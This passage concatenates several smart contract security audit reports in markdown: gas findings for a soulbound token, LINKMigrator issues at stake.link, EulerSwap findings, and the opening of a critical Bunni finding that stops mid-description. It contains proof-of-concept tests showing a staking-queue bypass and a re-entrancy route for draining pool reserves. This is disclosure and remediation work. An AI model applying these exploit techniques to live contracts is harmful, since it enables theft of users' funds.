### Prefer `calldata` to `memory` for external read-only inputs

**Description:** Prefer `calldata` to `memory` for external read-only inputs:
```diff
-   function mintWithTerms(bytes memory signature) external payable returns (uint256 tokenId) {
+   function mintWithTerms(bytes calldata signature) external payable returns (uint256 tokenId) {

-   function _verifySignature(bytes memory signature) internal view returns (bool) {
+   function _verifySignature(bytes calldata signature) internal view returns (bool) {
```

Gas results:
```diff
{
-  "mintWithTerms": "137638"
+  "mintWithTerms": "137299"
}
```

**Evo:**
Fixed in commit [b4fcadb](https://github.com/contractlevel/sbt/commit/b4fcadbd9c5684cc4e3b1ee3c39f72c406aaf658).

**Cyfrin:** Verified.


### Use solady `safeTransferETH` to send eth

**Description:** Using solady [`safeTransferETH`](https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L90-L98) is a [more efficient](https://github.com/devdacian/solidity-gas-optimization?tab=readme-ov-file#10-use-safetransferlibsafetransfereth-instead-of-solidity-call-effective-035-cheaper) way to send eth. Also since there is no point in leaving eth inside the contract, consider removing the `amountToWithdraw` input parameter and checks associated with it; instead just send the entire contract balance:
```solidity
function withdrawFees() external onlyOwner {
    uint256 amountToWithdraw = address(this).balance;
    if(amountToWithdraw > 0) {
        // from https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L90-L98
        /// @solidity memory-safe-assembly
        assembly {
            if iszero(call(gas(), caller(), amountToWithdraw, codesize(), 0x00, codesize(), 0x00)) {
                mstore(0x00, 0xefde920d) // `SoulBoundToken__WithdrawFailed()`.
                revert(0x1c, 0x04)
            }
        }

        emit FeesWithdrawn(amountToWithdraw);
    }
}
```

Gas result:
```diff
{
- "withdrawFees": "13462"
+ "withdrawFees": "13353"
}
```

**Evo:**
Fixed in commit [b4fcadb](https://github.com/contractlevel/sbt/commit/b4fcadbd9c5684cc4e3b1ee3c39f72c406aaf658).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md ------


------ FILE START car/reports_md/2025-06-04-cyfrin-stakelink-pr152-linkmigrator-v2.0.md ------

**Lead Auditors**

[Immeas](https://twitter.com/0ximmeas)

[holydevoti0n](https://x.com/HolyDevoti0n)

---

# Findings
## Low Risk


### Minimum deposit value not enforced in `LINKMigrator`

**Description:** The `LINKMigrator` contract includes a `queueDepositMin` field intended to define the minimum deposit amount. However, this value is currently unused, allowing users to deposit amounts as small as 1 juel (1e-18 LINK).

**Impact:** Without enforcement, users can submit deposits smaller than the protocol likely intended, potentially increasing overhead or disrupting expected deposit behavior.

**Recommended Mitigation:** Consider either removing the unused `queueDepositMin` field or enforcing it in the `initiateMigration` function:

```diff
  function initiateMigration(uint256 _amount) external {
-     if (_amount == 0) revert InvalidAmount();
+     if (_amount < queueDepositMin) revert InvalidAmount();
```

**stake.link:**
Fixed in [`0abd4f8`](https://github.com/stakedotlink/contracts/commit/0abd4f86e3c5ed28f9ea444fdc9db5394ad5b5ed)

**Cyfrin:** Verified. `queueDepositMin` is removed. `minStakeAmount` is now fetched from the community pool and verified against `_amount`:
```solidity
(uint256 minStakeAmount, ) = communityPool.getStakerLimits();
if (_amount < minStakeAmount) revert InvalidAmount();
```


### Missing `poolStatus` check in `bypassQueue`

**Description:** The `bypassQueue` function in `PriorityPool.sol` doesn't check the pool's status before depositing tokens directly into the staking pool.
```solidity
function bypassQueue(
    address _account,
    uint256 _amount,
    bytes[] calldata _data
) external onlyQueueBypassController {
    token.safeTransferFrom(msg.sender, address(this), _amount);

    uint256 canDeposit = stakingPool.canDeposit();
    if (canDeposit < _amount) revert InsufficientDepositRoom();

    stakingPool.deposit(_account, _amount, _data);
}
```
The pool status check is part of the protocol's emergency response system. The [RebaseController](https://github.com/stakedotlink/contracts/blob/4b6b0811835bafa4c8379a39512bfe99bc6c6ebf/contracts/contracts/core/RebaseController.sol#L120-L140) can set the pool status to `CLOSED` during emergency situations, such as when the strategy is leading to a loss of funds. This reason can be seen on `RebaseController` when reopening the pool:
```solidity
@>     * @notice Reopens the priority pool and security pool after they were paused as a result
@>     * of a loss and updates strategy rewards in the staking pool
     * @param _data encoded data to pass to strategies
     */
    function reopenPool(bytes calldata _data) external onlyOwner {
        if (priorityPool.poolStatus() == IPriorityPool.PoolStatus.OPEN) revert PoolOpen();


        priorityPool.setPoolStatus(IPriorityPool.PoolStatus.OPEN);
        if (address(securityPool) != address(0) && securityPool.claimInProgress()) {
            securityPool.resolveClaim();
        }
        _updateRewards(_data);
    }
```
This missing check in the `bypassQueue` function allows user funds to be deposited when the pool is `CLOSED`, potentially causing deposited tokens to be lost during protocol emergency shutdowns.

**Impact:** LINK tokens can be deposited via `LINKMigrator` even when the `PriorityPool` is `CLOSED` or `DRAINING`, effectively bypassing the emergency pause mechanism intended for use during security incidents. This could potentially result in users losing funds. However, this risk is considered low in the context of the Chainlink community pool, as there is no inherent mechanism for loss, slashing only occurs in the operator pool. As such, the scenario would only pose a threat if one of the involved contracts were compromised and a user still migrates to it.

**Recommended Mitigation:** Add a pool status check in the bypassQueue function:
```diff
function bypassQueue(
    address _account,
    uint256 _amount,
    bytes[] calldata _data
) external onlyQueueBypassController {
+    if (poolStatus != PoolStatus.OPEN) revert DepositsDisabled();
    ...
}
```

**stake.link:**
Fixed in [`c595886`](https://github.com/stakedotlink/contracts/commit/c595886faef706a74bc11815b103af6670d7ed4d)

**Cyfrin:** Verified. The recommended mitigation was implemented.


### Existing Chainlink stakers can skip queue by bypassing migration requirements

**Description:** The purpose of `LINKMigrator` is that users can migrate their existing position from the Chainlink community pool to stake.link vaults, even when the community pool is at full utilization, since vacating a position frees up space. For users without an existing position, a queueing system (`PriorityQueue`) is used to wait for available slots in the community pool.

However, a user with an existing position can exploit this mechanism by faking a migration. By moving their position to another address (e.g., a small contract they control), they can bypass the queue and open a new position in stake.link if space is available.

Migration begins with a call to [`LINKMigrator::initiateMigration`](https://github.com/stakedotlink/contracts/blob/0bd5e1eecd866b2077d6887e922c4c5940a6b452/contracts/linkStaking/LINKMigrator.sol#L79-L92):

```solidity
function initiateMigration(uint256 _amount) external {
    if (_amount == 0) revert InvalidAmount();

    uint256 principal = communityPool.getStakerPrincipal(msg.sender);

    if (principal < _amount) revert InsufficientAmountStaked();
    if (!_isUnbonded(msg.sender)) revert TokensNotUnbonded();

    migrations[msg.sender] = Migration(
        uint128(principal),
        uint128(_amount),
        uint64(block.timestamp)
    );
}
```

Here, the user's principal is recorded. Later, the migration is completed via `transferAndCall`, which triggers [`LINKMigrator::onTokenTransfer`](https://github.com/stakedotlink/contracts/blob/0bd5e1eecd866b2077d6887e922c4c5940a6b452/contracts/linkStaking/LINKMigrator.sol#L100-L117):

```solidity
uint256 amountWithdrawn = migration.principalAmount -
    communityPool.getStakerPrincipal(_sender);
if (amountWithdrawn < _value) revert InsufficientTokensWithdrawn();
```

This compares the recorded and current principal to verify the withdrawal. However, it does not validate that the total staked amount in the community pool has decreased. As a result, a user can withdraw their position, transfer it to a contract they control, and still pass the check, allowing them to deposit directly into stake.link and bypass the queue.

**Impact:** A user with an existing position in the Chainlink community vault can circumvent the queue system and gain direct access to stake.link staking. This requires being in the claim period, having sufficient LINK to stake again, and available space in the Chainlink community vault. It also resets the bonding period, meaning the user would need to wait another 28 days (the Chainlink bonding period at the time of writing) before interacting with the new position. Nevertheless, this behavior could lead to unfair queue-skipping and undermine the fairness of the protocol.

**Proof of Concept:** Add the following test to `link-migrator.ts` which demonstrates the queue bypass by simulating a migration and re-staking via a third contract::
```javascript
it('can bypass queue using existing position', async () => {
  const { migrator, communityPool, accounts, token, stakingPool } = await loadFixture(
    deployFixture
  )

  // increase max pool size so we have space for the extra position
  await communityPool.setMaxPoolSize(toEther(3000))

  // deploy our small contract to hold the existing position
  const chainlinkPosition = (await deploy('ChainlinkPosition', [
    communityPool.target,
    token.target,
  ])) as ChainlinkPosition

  // get to claim period
  await communityPool.unbond()
  await time.increase(unbondingPeriod)

  // start batch transaction
  await ethers.provider.send('evm_setAutomine', [false])

  // 1. call initiate migration
  await migrator.initiateMigration(toEther(1000))

  // 2. unstake
  await communityPool.unstake(toEther(1000))

  // 3. transfer the existing position to a contract you control
  await token.transfer(chainlinkPosition.target, toEther(1000))
  await chainlinkPosition.deposit()

  // 4. transferAndCall a new position bypassing the queue
  await token.transferAndCall(
    migrator.target,
    toEther(1000),
    ethers.AbiCoder.defaultAbiCoder().encode(['bytes[]'], [[encodeVaults([])]])
  )
  await ethers.provider.send('evm_mine')
  await ethers.provider.send('evm_setAutomine', [true])

  // user has both a 1000 LINK position in stake.link StakingPool and chainlink community pool
  assert.equal(fromEther(await communityPool.getStakerPrincipal(accounts[0])), 0)
  assert.equal(fromEther(await stakingPool.balanceOf(accounts[0])), 1000)
  assert.equal(fromEther(await communityPool.getStakerPrincipal(chainlinkPosition.target)), 1000)

  // community pool is full again
  assert.equal(fromEther(await communityPool.getTotalPrincipal()), 3000)
  assert.equal(fromEther(await stakingPool.totalStaked()), 2000)
  assert.deepEqual(await migrator.migrations(accounts[0]), [0n, 0n, 0n])
})
```
Along with `ChainlinkPosition.sol`:
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./interfaces/IStaking.sol";
import "../core/interfaces/IERC677.sol";

contract ChainlinkPosition {

    IStaking communityPool;
    IERC677 link;

    constructor(address _communityPool, address _link) {
        communityPool = IStaking(_communityPool);
        link = IERC677(_link);
    }

    function deposit() public {
        link.transferAndCall(address(communityPool), link.balanceOf(address(this)), "");
    }
}
```

**Recommended Mitigation:** In `LINKMigrator::onTokenTransfer`, consider validating that the total principal in the community pool has decreased by at least `_value`, to ensure the migration reflects an actual exit from the community pool.

**stake.link:**
Fixed in [`de672a7`](https://github.com/stakedotlink/contracts/commit/de672a77813d507896502c20241618230af1bd85)

**Cyfrin:** Verified. Recommended mitigation was implemented. Community pool total principal is now recorded in `initiateMigration` then compared to the new pool total principal in `onTokenTransfer`.

\clearpage
## Informational


### Unused error

**Description:** In [`LINKMigrator.sol#L47`](https://github.com/stakedotlink/contracts/blob/0bd5e1eecd866b2077d6887e922c4c5940a6b452/contracts/linkStaking/LINKMigrator.sol#L47) the error `InvalidPPState` is unused, consider using or removing it.

**stake.link:**
Fixed in [`6827d9d`](https://github.com/stakedotlink/contracts/commit/6827d9df664de5132d81570f03b55ed4a482dff5)

**Cyfrin:** Verified.


### Lack of events emitted on important state changes

**Description:** [`LINKMigrator::setQueueDepositMin`](https://github.com/stakedotlink/contracts/blob/0bd5e1eecd866b2077d6887e922c4c5940a6b452/contracts/linkStaking/LINKMigrator.sol#L119-L125) and [`PriorityPool::setQueueBypassController`](https://github.com/stakedotlink/contracts/blob/0bd5e1eecd866b2077d6887e922c4c5940a6b452/contracts/core/priorityPool/PriorityPool.sol#L678-L685) change internal state without emitting events. Events are important for off-chain tracking and transparency. Consider emitting events from these functions.

**stake.link:**
Acknowledged.


### Consider renaming `LINKMigrator::_isUnbonded` for clarity

**Description:** In the `LINKMigrator` contract, the function [`_isUnbonded`](https://github.com/stakedotlink/contracts/blob/0bd5e1eecd866b2077d6887e922c4c5940a6b452/contracts/linkStaking/LINKMigrator.sol#L132-L137) checks whether a user is currently within the claim period for Chainlink staking:

```solidity
function _isUnbonded(address _account) private view returns (bool) {
    uint256 unbondingPeriodEndsAt = communityPool.getUnbondingEndsAt(_account);
    if (unbondingPeriodEndsAt == 0 || block.timestamp < unbondingPeriodEndsAt) return false;

    return block.timestamp <= communityPool.getClaimPeriodEndsAt(_account);
}
```

While functionally correct, the name `_isUnbonded` may not clearly convey its purpose, as it specifically checks whether a user is in the claim period. For improved clarity and consistency with Chainlinks naming conventionsuch as in [`StakingPoolBase::_inClaimPeriod`](https://etherscan.io/address/0xbc10f2e862ed4502144c7d632a3459f49dfcdb5e#code)renaming it could make the intent more immediately clear:

```solidity
function _inClaimPeriod(Staker storage staker) private view returns (bool) {
  if (staker.unbondingPeriodEndsAt == 0 || block.timestamp < staker.unbondingPeriodEndsAt) {
    return false;
  }

  return block.timestamp <= staker.claimPeriodEndsAt;
}
```

**Recommended Mitigation:** Consider renaming `_isUnbonded` to `_inClaimPeriod` to better reflect its logic and improve code readability.

**stake.link:**
Fixed in [`9d710bf`](https://github.com/stakedotlink/contracts/commit/9d710bf35304e9b45ed1ad8468714915817904a1)

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Unchanged state variables can be immutable

**Description:** None of:
* [`LINKMigrator.linkToken`](https://github.com/stakedotlink/contracts/blob/0bd5e1eecd866b2077d6887e922c4c5940a6b452/contracts/linkStaking/LINKMigrator.sol#L22)
* [`LINKMigrator.communityPool`](https://github.com/stakedotlink/contracts/blob/0bd5e1eecd866b2077d6887e922c4c5940a6b452/contracts/linkStaking/LINKMigrator.sol#L24)
* [`LINKMigrator.priorityPool`](https://github.com/stakedotlink/contracts/blob/0bd5e1eecd866b2077d6887e922c4c5940a6b452/contracts/linkStaking/LINKMigrator.sol#L27)

Are changed outside of the constructor. Consider making them `immutable` to save on gas when accessing them.

**stake.link:**
Fixed in [`6f9d9b7`](https://github.com/stakedotlink/contracts/commit/6f9d9b77201184d2dfc8f4c06f3430f2d360db24)

**Cyfrin:** Verified.


### Inefficient storage layout in `LINKMigrator.Migration`

**Description:** Here's the [`LINKMigrator.Migration`](https://github.com/stakedotlink/contracts/blob/0bd5e1eecd866b2077d6887e922c4c5940a6b452/contracts/linkStaking/LINKMigrator.sol#L31-L38) struct:

```solidity
struct Migration {
    // amount of principal staked in Chainlink community pool
    uint128 principalAmount;
    // amount to migrate
    uint128 amount;
    // timestamp when migration was initiated
    uint64 timestamp;
}
```

This struct occupies more than 256 bits and therefore spans two storage slots. However, any LINK amount can be safely stored in a `uint96`, since the total LINK supply is 1 billion (10^9 \* 10^18), which is well below the maximum value representable by a `uint96` (\~7.9 \* 10^28). By changing both amount fields to `uint96`, the struct would comprise `uint96 + uint96 + uint64`, which fits neatly within a single 256-bit storage slot.

**Cyfrin:** Not applicable after fix in [`de672a7`](https://github.com/stakedotlink/contracts/commit/de672a77813d507896502c20241618230af1bd85)

\clearpage

------ FILE END car/reports_md/2025-06-04-cyfrin-stakelink-pr152-linkmigrator-v2.0.md ------


------ FILE START car/reports_md/2025-06-06-cyfrin-eulerswap-v2.1.md ------

**Lead Auditors**

[Immeas](https://twitter.com/0ximmeas)

[BladeSec](https://x.com/BladeSec)

[ChainDefenders](https://x.com/ChDefendersEth) ([0x539](https://x.com/1337web3) & [PeterSR](https://x.com/PeterSRWeb3))


---

# Findings
## Low Risk


### Protocol Fee Recipient Updates Are Not Enforced On Old EulerSwap Instances

**Description:** The `protocolFeeRecipient` value is stored in the parameters of each `EulerSwap` instance at the time of its deployment. When the [`ProtocolFee::setProtocolFeeRecipient`](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/utils/ProtocolFee.sol#L21-L23) function in the `ProtocolFee` contract is called to update the `protocolFeeRecipient`, the change only affects new instances of `EulerSwap` deployed after the update. Existing `EulerSwap` instances retain the old `protocolFeeRecipient` value since it is embedded in their parameters during deployment and is not dynamically referenced.

**Impact:** This creates a discrepancy where older `EulerSwap` instances continue to send protocol fees to the outdated recipient address, potentially leading to financial losses or mismanagement of funds. It also introduces operational complexity, as the protocol owner must manually update or redeploy affected `EulerSwap` instances to align them with the new recipient address.

**Proof of Concept:** Add the following test to the `HookFees.t.sol` file:
```solidity
function test_protocolFeeRecipientChange() public {
	// Define two protocol fee recipients
	address recipient1 = makeAddr("recipient1");
	address recipient2 = makeAddr("recipient2");

	// Set initial protocol fee and recipient in factory
	uint256 protocolFee = 0.1e18; // 10% of LP fee
	eulerSwapFactory.setProtocolFee(protocolFee);
	eulerSwapFactory.setProtocolFeeRecipient(recipient1);

	// Deploy pool1 with recipient1
	EulerSwap pool1 = createEulerSwapHookFull(
		60e18,
		60e18,
		0.001e18,
		1e18,
		1e18,
		0.4e18,
		0.85e18,
		protocolFee,
		recipient1
	);

	// Verify pool1's protocolFeeRecipient
	IEulerSwap.Params memory params1 = pool1.getParams();
	assertEq(params1.protocolFeeRecipient, recipient1);

	// Perform a swap in pool1
	uint256 amountIn = 1e18;
	assetTST.mint(anyone, amountIn);
	vm.startPrank(anyone);
	assetTST.approve(address(minimalRouter), amountIn);
	bool zeroForOne = address(assetTST) < address(assetTST2);
	minimalRouter.swap(pool1.poolKey(), zeroForOne, amountIn, 0, "");
	vm.stopPrank();

	// Check that fees were sent to recipient1
	uint256 feeCollected1 = assetTST.balanceOf(recipient1);
	assertGt(feeCollected1, 0);
	assertEq(assetTST.balanceOf(recipient2), 0);

	// Change protocolFeeRecipient to recipient2 in factory
	eulerSwapFactory.setProtocolFeeRecipient(recipient2);

	// Perform another swap in pool1
	assetTST.mint(anyone, amountIn);
	vm.startPrank(anyone);
	assetTST.approve(address(minimalRouter), amountIn);
	minimalRouter.swap(pool1.poolKey(), zeroForOne, amountIn, 0, "");
	vm.stopPrank();

	// Check that additional fees were sent to recipient1, not recipient2
	uint256 newFeeCollected1 = assetTST.balanceOf(recipient1);
	assertGt(newFeeCollected1, feeCollected1); // recipient1 received more fees
	assertEq(assetTST.balanceOf(recipient2), 0); // recipient2's balance unchanged
}
```

**Recommended Mitigation:** Refactor the `EulerSwap` contract to reference the `protocolFeeRecipient` dynamically from the `EulerSwapFactory` contract instead of storing it in the deployment parameters. This ensures that any updates to the `protocolFeeRecipient` are immediately reflected across all `EulerSwap` instances, both old and new.

**Euler:** Acknowledged.


### Configured reserves may not guarantee protection against liquidation

**Description:** According to the [EulerSwap whitepaper](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/docs/whitepaper/EulerSwap_White_Paper.pdf):

> The space of possible reserves is determined by how much real liquidity an LP has and how much debt their operator is allowed to hold. Since EulerSwap AMMs do not always hold the assets used to service swaps at all times, they perform calculations based on virtual reserves and debt limits, rather than on strictly real reserves. Each EulerSwap LP can configure independent virtual reserve levels. These reserves define the maximum debt exposure an AMM will take on. Note that the effective LTV must always remain below the borrowing LTV of the lending vault to prevent liquidation.

This implies that, under proper configuration, an AMM should not be at risk of liquidation due to excessive loan-to-value (LTV). However, external factors can still undermine this guarantee.

For example, if another position in the same collateral vault is liquidated and leaves behind bad debt, the value of the shared collateral used for liquidity could drop. This would affect the effective LTV of all positions using that vault, including those managed by the EulerSwap AMM.

An attacker could exploit this situation by initiating a swap that pushes the AMM's position right up to the liquidation threshold, leveraging the degraded collateral value caused by unrelated bad debt.

**Recommended Mitigation:** Consider enforcing an explicit LTV check after each borrowing operation, and introduce a configurable maximum LTV parameter in `EulerSwapParams`. Additionally, clarify in the documentation that Euler account owners are responsible for monitoring the health of their vaults and should take proactive steps if the collateral accrues bad debt or drops in valuesince this can happen independently of swap activity.

**Euler:** Acknowledged. Doing a health computation at the end of a swap would cost too much gas.

**Cyfrin:** The Euler team added several points in their documentation regarding liquidation concerns in [PR#93](https://github.com/euler-xyz/euler-swap/pull/93)

\clearpage
## Informational


### Unused imports and errors

**Description:** The following imports are unused:
- [`IEVC` and `IEVault`, `EulerSwapPeriphery.sol#L6-L7`](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/EulerSwapPeriphery.sol#L6-L7)

And the following error is unused:
- [`InvalidQuery`, `EulerSwapFactory.sol#L36`](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/EulerSwapFactory.sol#L36)

Consider removing them.

**Euler:** Fixed in commit [`6109f53`](https://github.com/euler-xyz/euler-swap/pull/96/commits/6109f53c7b49be41867d9857d6bb0b6869761a02)

**Cyfrin:** Verified.


### Lack of events emitted on state changes

**Description:** Both [`ProtocolFee::setProtocolFee`](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/utils/ProtocolFee.sol#L14-L19) and [`ProtocolFee::setProtocolFeeRecipient`](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/utils/ProtocolFee.sol#L21-L23) changes state for the `EulerSwapFactory` however no events are emitted.

Consider emitting events from these functions for better off-chain tracking and transparency.

**Euler:** Fixed in commit [`05a9148`](https://github.com/euler-xyz/euler-swap/pull/97/commits/05a91488dcaf27633c26699e98694d99b73d20ea)

**Cyfrin:** Verified.



### Lack of input validation

**Description:** In the [constructor](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/EulerSwapFactory.sol#L44-L50) for `EulerSwapFactory` there's no sanity check that the addresses for  `evkFactory_`, `eulerSwapImpl_`, and `feeOwner_` aren't `address(0)` which is a simple mistake to make.

Consider validating that these are not `address(0)`.

For example:
```solidity
require(evkFactory_ != address(0), "Zero address");
require(eulerSwapImpl_ != address(0), "Zero address");
require(feeOwner_ != address(0), "Zero address");
```

**Euler:** Acknowledged.

\clearpage
## Gas Optimization


### Unnecessary extra storage reads when swapping

**Description:** When a swap is executed, whether via EulerSwap or Uniswap V4, a reentrant hook is employed:

[`UniswapHook::nonReentrantHook`](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/UniswapHook.sol#L67-L80):

```solidity
modifier nonReentrantHook() {
    {
        CtxLib.Storage storage s = CtxLib.getStorage();
        require(s.status == 1, LockedHook());
        s.status = 2;
    }

    _;

    {
        CtxLib.Storage storage s = CtxLib.getStorage();
        s.status = 1;
    }
}
```

Here, `CtxLib.getStorage()` is called once to load the storage struct and set `status` to `2`, then again afterward to restore `status` back to `1`.

Later in the swap flow, the same storage slot is reloaded multiple times:

1. In [`QuoteLib::calcLimits`](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/libraries/QuoteLib.sol#L70-L71):

   ```solidity
   function calcLimits(IEulerSwap.Params memory p, bool asset0IsInput) internal view returns (uint256, uint256) {
       CtxLib.Storage storage s = CtxLib.getStorage();
       
   }
   ```
2. In [`QuoteLib::findCurvePoint`](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/libraries/QuoteLib.sol#L150-L155):

   ```solidity
   function findCurvePoint(IEulerSwap.Params memory p, uint256 amount, bool exactIn, bool asset0IsInput)
       internal
       view
       returns (uint256 output)
   {
       CtxLib.Storage storage s = CtxLib.getStorage();
       
   }
   ```
3. And again in [`UniswapHook::_beforeSwap`](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/UniswapHook.sol#L129) just before updating reserves:

   ```solidity
   CtxLib.Storage storage s = CtxLib.getStorage();
   ```

Each `getStorage()` call emits an extra SLOAD, increasing the overall gas cost of the swap.


Consider embedding the non-reentrant logic directly within `_beforeSwap`, fetch storage only once, and cache the reserve values for use in the CurveLib calls. For example:

```solidity
function _beforeSwap(
    address,
    PoolKey calldata key,
    IPoolManager.SwapParams calldata params,
    bytes calldata
)
    internal
    override
    returns (bytes4, BeforeSwapDelta, uint24)
{
    IEulerSwap.Params memory p = CtxLib.getParams();

    // Single storage load and reentrancy guard
    CtxLib.Storage storage s = CtxLib.getStorage();
    require(s.status == 1, LockedHook());
    s.status = 2;

    // Cache reserves locally
    uint112 reserve0 = s.reserve0;
    uint112 reserve1 = s.reserve1;

    //  perform limit and curve-point calculations using reserve0/reserve1 

    // Update reserves and release guard
    s.reserve0 = uint112(newReserve0);
    s.reserve1 = uint112(newReserve1);
    s.status = 1;

    return (BaseHook.beforeSwap.selector, returnDelta, 0);
}
```

By doing so, you eliminate redundant storage reads, reducing gas consumption on every swap. Same goes for the `EulerSwap::swap` flow as well.


**Euler:** Acknowledged.


### Vault calls can be done directly to EVC

**Description:** In [`FundsLib::depositAssets`](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/libraries/FundsLib.sol#L61-L114), two calls are made to the Euler Vault:

* [Line 92](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/libraries/FundsLib.sol#L92):

  ```solidity
  uint256 repaid = IEVault(vault).repay(amount > debt ? debt : amount, p.eulerAccount);
  ```

* [Line 104](https://github.com/euler-xyz/euler-swap/blob/1022c0bb3c034d905005f4c5aee0932a66adf4f8/src/libraries/FundsLib.sol#L104):

  ```solidity
  try IEVault(vault).deposit(amount, p.eulerAccount) {}
  ```

Both of these function calls are routed through the Ethereum Vault Connector (EVC) via the `callThroughEVC` modifier defined in the Vault:

* [`EVault::repay`](https://github.com/euler-xyz/euler-vault-kit/blob/master/src/EVault/EVault.sol#L121):

  ```solidity
  function repay(uint256 amount, address receiver) public virtual override callThroughEVC use(MODULE_BORROWING) returns (uint256) {}
  ```

* [`EVault::deposit`](https://github.com/euler-xyz/euler-vault-kit/blob/master/src/EVault/EVault.sol#L86):

  ```solidity
  function deposit(uint256 amount, address receiver) public virtual override callThroughEVC use(MODULE_VAULT) returns (uint256) {}
  ```

Each call incurs the cost of a contract jump due to the indirection through the Vault contract. To reduce this overhead, these operations can instead be invoked directly on the EVC, as is already done for other vault interactions within `FundsLib`.

**Euler:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2025-06-06-cyfrin-eulerswap-v2.1.md ------


------ FILE START car/reports_md/2025-06-10-cyfrin-bunni-v2.1.md ------

**Lead Auditors**

[Giovanni Di Siena](https://x.com/giovannidisiena)

[Draiakoo](https://x.com/draiakoo)

**Assisting Auditors**

[Pontifex](https://x.com/pontifex73)

---

# Findings
## Critical Risk


### Pools configured with a malicious hook can bypass the `BunniHub` re-entrancy guard to drain all raw balances and vault reserves of legitimate pools

**Description:** The `BunniHub` is the main contract that both holds and accounts the raw balances and  vault reserves that each pool has deposited. It inherits `ReentrancyGuard` which implements the `nonReentrant` modifier:

```solidity
modifier nonReentrant() {
    _nonReentrantBefore();
    _;
    _nonReentrantAfter();
}

function _nonReentrantBefore() internal {
    uint256 statusSlot = STATUS_SLOT;
    uint256 status;
    /// @solidity memory-safe-assembly
    assembly {
        status := tload(statusSlot)
    }
    if (status == ENTERED) revert ReentrancyGuard__ReentrantCall();

    uint256 entered = ENTERED;
    /// @solidity memory-safe-assembly
    assembly {
        tstore(statusSlot, entered)
    }
}

function _nonReentrantAfter() internal {
    uint256 statusSlot = STATUS_SLOT;
    uint256 notEntered = NOT_ENTERED;
    /// @solidity memory-safe-assembly
    assembly {
        tstore(statusSlot, notEntered)
    }
}
```

During the rebalance of a Bunni pool, it is intended to separate this re-entrancy logic into before/after hooks. These functions re-use the same global re-entrancy guard transient storage slot to lock the `BunniHub` against any potential re-entrant execution by a malicious fulfiller:

```solidity
function lockForRebalance(PoolKey calldata key) external notPaused(6) {
    if (address(_getBunniTokenOfPool(key.toId())) == address(0)) revert BunniHub__BunniTokenNotInitialized();
    if (msg.sender != address(key.hooks)) revert BunniHub__Unauthorized();
    _nonReentrantBefore();
}

function unlockForRebalance(PoolKey calldata key) external notPaused(7) {
    if (address(_getBunniTokenOfPool(key.toId())) == address(0)) revert BunniHub__BunniTokenNotInitialized();
    if (msg.sender != address(key.hooks)) revert BunniHub__Unauthorized();
    _nonReentrantAfter();
}
```

However, since the hook of a Bunni pool is not constrained to be the canonical `BunniHook` implementation, anyone can create a malicious hook that calls `unlockForRebalance()` directly to unlock the reentrancy guard:

```solidity
function deployBunniToken(HubStorage storage s, Env calldata env, IBunniHub.DeployBunniTokenParams calldata params)
    external
    returns (IBunniToken token, PoolKey memory key)
{
    ...

    // ensure hook params are valid
    if (address(params.hooks) == address(0)) revert BunniHub__HookCannotBeZero();
    if (!params.hooks.isValidParams(params.hookParams)) revert BunniHub__InvalidHookParams();

    ...
}
```

The consequence of this behavior is that the re-entrancy protection is bypassed for all `BunniHub` functions to which the `nonReentrant` modifier is applied. This is especially problematic for `hookHandleSwap()` which allows the calling hook to deposit and withdraw funds accounted to the corresponding pool. To summarise, this function:
1. Caches raw balances and vault reserves.
2. Transfers ERC-6909 input tokens from the hook to the `BunniHub`.
3. Attempts to transfer ERC-6909 output tokens to the hook and withdraws reserves from the specified vault if it has insufficient raw balance.
4. Attempts to reach `targetRawbalance` for `token0` by depositing or withdrawing funds to/from the corresponding vault.
5. Attempts to reach `targetRawbalance` for `token1` by depositing or withdrawing funds to/from the corresponding vault.
6. Updates the storage state by **setting**, rather than incrementing or decrementing, the cached raw balances and vault reserves.

Initially, it does not appear possible to re-enter due to transfers in ERC-6909 tokens; however, the possibility exists to create a malicious vault that, upon attempting to reach the `targetRawBalance` using the deposit or withdraw functions, routes execution back to the hook in order to re-enter the function. Given the pool storage state is cached and updated at the end of execution, it is possible for the hook to withdraw up to its accounted balance on each re-entrant invocation. After a sufficiently large recurson depth, the state will be updated by setting the storage variables to the cached state, bypassing any underflow due to insufficient funds accounted to the hook.

A very similar attack vector is present in the `withdraw()` function, in which re-entrant calls to recursively burn a fraction of malicious pool shares can access more than the accounted hook balances. This is again possible because intermediate execution is over the cached pool state which is updated only after each external call to the vault(s). If the vault corresponding to `token0` is malicious, unlocks the `BunniHub` through a malicious hook as described above, and then attempts to withdraw a smaller fraction of the Bunni share tokens such that the total burned amount does not overflow the available balance, the entire `token1` reserve can be drained.

```solidity
    function withdraw(HubStorage storage s, Env calldata env, IBunniHub.WithdrawParams calldata params)
        external
        returns (uint256 amount0, uint256 amount1)
    {
        /// -----------------------------------------------------------------------
        /// Validation
        /// -----------------------------------------------------------------------

        if (!params.useQueuedWithdrawal && params.shares == 0) revert BunniHub__ZeroInput();

        PoolId poolId = params.poolKey.toId();
@>      PoolState memory state = getPoolState(s, poolId);

        ...

